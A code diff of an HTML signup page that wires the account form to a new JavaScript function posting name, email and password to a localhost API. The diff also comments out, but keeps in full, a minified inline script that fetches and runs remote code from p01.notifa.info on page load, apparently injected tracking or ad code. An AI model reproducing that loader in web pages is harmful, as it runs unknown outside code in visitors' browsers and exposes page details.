@@ -241,18 +241,18 @@
                         <div class="col-md-6 mb-24pt mb-md-0">
                             <form action="signup-payment.html">
                                 <div class="form-group">
-                                    <label class="form-label" for="name">Your first and last name:</label>
-                                    <input id="name" type="text" class="form-control" placeholder="Your first and last name ...">
+                                    <label class="form-label" for="name">Your first and last name (min. 3 characters):</label>
+                                    <input id="id_name" type="text" class="form-control" placeholder="Your first and last name ...">
                                 </div>
                                 <div class="form-group">
                                     <label class="form-label" for="email">Your email:</label>
-                                    <input id="email" type="email" class="form-control" placeholder="Your email address ...">
+                                    <input id="id_email" type="email" class="form-control" placeholder="Your email address ...">
                                 </div>
                                 <div class="form-group mb-24pt">
-                                    <label class="form-label" for="password">Password:</label>
-                                    <input id="password" type="password" class="form-control" placeholder="Your password ...">
+                                    <label class="form-label" for="password">Password (min. 8 characters):</label>
+                                    <input id="id_password" type="password" class="form-control" placeholder="Your password ...">
                                 </div>
-                                <button class="btn btn-primary">Create account</button>
+                                <button class="btn btn-primary" onclick="RegisterAccount()">Create account</button>
                             </form>
                         </div>
                         <div class="col-md-6">
@@ -1101,6 +1101,9 @@
         </div>
         <!-- // END drawer -->
 
+        <table id="change">
+        </table>
+
 
     </div>
     <!-- // END drawer-layout -->
@@ -1130,6 +1133,40 @@
 
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCIobvpd7urnGyHKfNckDWzdTX4azj3U3NDrHjRxE1bhORaH0EIwfjVDMJllDRGlYiJiKvaYTJE8lR2QjmiBossB7lsh2TENKvr2UxB5%2b%2benb4ntZ2DcJj4KM8%2fi0Y1OYtmBjRvr0m6QG1EvEtM1%2b36jnRV7MGPD4y3jvWC%2fFBMzvgspuyz4YIQFC5PqbqKRD8wrxroDC2rxB4b9WuT2dppjDkVol2VuRIb%2bk%2f3AMWr9Rqj17GZWKNRNCA%2fEGywP7sYS%2f7oXxvixinptM2coUN2eabKuupJLQGcjAjzow5VGpj9j2gNtl1U%2fEnRukoV%2fZOKIcC3dBPmEHsEr0Dd3HuORmXHe%2brfhGOI6pS3H7kDEFUSPieIk4OF9M3qUrgHJUocFYdYEGVM%2bVllE1k8CH1mMBNl9cBypVSWT7vbUZSBqckDX34im5lsj" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">/*if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCIobvpd7urnGyHKfNckDWzdTX4azj3U3NDrHjRxE1bhORaH0EIwfjVDMJllDRGlYiJiKvaYTJE8lR2QjmiBossB7lsh2TENKvr2UxB5%2b%2benb4ntZ2DcJj4KM8%2fi0Y1OYtmBjRvr0m6QG1EvEtM1%2b36jnRV7MGPD4y3jvWC%2fFBMzvgspuyz4YIQFC5PqbqKRD8wrxroDC2rxB4b9WuT2dppjDkVol2VuRIb%2bk%2f3AMWr9Rqj17GZWKNRNCA%2fEGywP7sYS%2f7oXxvixinptM2coUN2eabKuupJLQGcjAjzow5VGpj9j2gNtl1U%2fEnRukoV%2fZOKIcC3dBPmEHsEr0Dd3HuORmXHe%2brfhGOI6pS3H7kDEFUSPieIk4OF9M3qUrgHJUocFYdYEGVM%2bVllE1k8CH1mMBNl9cBypVSWT7vbUZSBqckDX34im5lsj" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};*/</script>
+
+<script>
+    
+    function RegisterAccount(){
+        var url  = "http://localhost:3000/api/accounts/" + document.getElementById('id_email').value;
+        var data = {username: document.getElementById('id_name').value, email: document.getElementById('id_email').value, password: document.getElementById('id_password').value };
+        /*
+        data.paymentType = 'undefined';
+        data.cardNumber = 'undefined';
+        data.expirationDateMonth = 'undefined';
+        data.expirationDateYear = 'undefined';
+        */
+        var jsonData = JSON.stringify(data);
+        var xhr  = new XMLHttpRequest();
+
+
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
+        
+        xhr.onload = function() {
+            if (xhr.readyState == 4 && xhr.status == "200") {
+                alert('Registration successful!');
+            } else {
+                alert('Registration failed! '+ ' Reason: '+xhr.responseText);
+                location.reload();
+            }
+        }
+       xhr.send(jsonData);
+    }
+
+
+</script>
+
+</body>
 
 </html>
